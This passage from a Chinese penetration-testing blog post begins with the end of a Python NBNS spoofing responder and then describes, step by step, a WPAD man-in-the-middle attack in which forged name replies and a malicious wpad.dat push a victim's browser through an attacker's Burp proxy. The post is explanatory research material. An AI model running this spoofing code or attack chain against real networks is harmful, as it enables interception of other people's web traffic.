(self.IPADDR, addr[<span class="hljs-number">0</span>], self.decode_name(name))<br>            self.nas.sendto(data, addr)<br>        self.nas.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    nbns.Answser()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析"><a href="#0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析" class="headerlink" title="0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析"></a>0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析</h3><p>利用 NBNS 名称解析进行基于 WPAD 的中间人攻击本质上还是利用了 Windows 系统的名称解析顺序和 NBNS 协议的缺陷。结合 [WPAD 协议分析及内网渗透利用](./WPAD 协议分析及内网渗透利用) 所述，在工作组环境中，客户端主机执行 WPAD 功能时，会遵循 Windows 系统的名称解析顺序，查询的名称均为 <strong>“WPAD”</strong>。那么，我们先广播进行“WPAD”名称的注册，然后监听 137 端口（如图5），等待局域网其他已启用 WPAD 功能的主机使用 IE 浏览器连接网络时，即可将受害者主机的浏览器代理设置为攻击者指定的代理服务器，之后就可以获得受害者的浏览器的上网记录。</p>
+<p>我们模拟出一个简单的攻击场景，如下图所示：</p>
+<p>![img](/img/利用 NBNS 协议缺陷进行 WPAD 中间人攻击/20171207135331-f46fc93c-db12-1.png)</p>
+<p> 图6：利用 NBNS 名称解析进行基于 WPAD 的中间人攻击 </p>
+<p>攻击者开启 NetBIOS 恶意应答程序，并监听 80 端口提供恶意 PAC 配置文件（wpad.dat）的下载，同时开启代理服务器（这里使用的是 Burp Suite HTTP 代理服务器）；</p>
+<p>受害者主机（Windows XP） 打开 IE 浏览器（已启用 WPAD  功能）开始上网，此时浏览器就会寻找当前局域网中的代理服务器，实际上是进行了 WPAD 的名称查询，可以从图中看到攻击者的恶意应答程序做了恶意响应，同时提供 PAC 配置文件下载的 HTTP 服务器打印出了日志信息，表明此时受害者的浏览器已经下载了恶意 PAC 配置文件（该文件内容为代理服务器地址信息）；</p>
+<p>之后，从 Burp Suite 中可以看到，受害者的浏览器使用了攻击者指定的代理服务器进行上网。</p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>利用 NetBIOS 域名解析协议进行中间人攻击的方式还有很多，关于 NetBIOS 协议的内容可以在相关的 RFC 文档中查阅，其中还有不少东西可以在内网渗透中利用到，如 OPCODE 字段的取值、BROWSER 协议等等，不论是攻击还是防御都需要进一步的研究。</p>
+<p><strong>参考文章：</strong><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1739">https://xz.aliyun.com/t/1739</a><br><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_614f473101017e10.html">http://blog.sina.com.cn/s/blog_614f473101017e10.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangaohui/p/5116519.html">https://www.cnblogs.com/wangaohui/p/5116519.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
+                    
+                      <a class="hover-with-bg" href="/tags/concept/">concept</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WPAD 协议分析及内网渗透利用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/">
+                        <span class="hidden-mobile">利用 LLMNR 名称解析缺陷劫持内网指定主机会话</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <span>Powered by</span> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <span>×</span> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            Pageviews: 
+            <span id="busuanzi_value_site_pv"></span>
+             times
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            Total Visitors: 
+            <span id="busuanzi_value_site_uv"></span>
+             persons
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
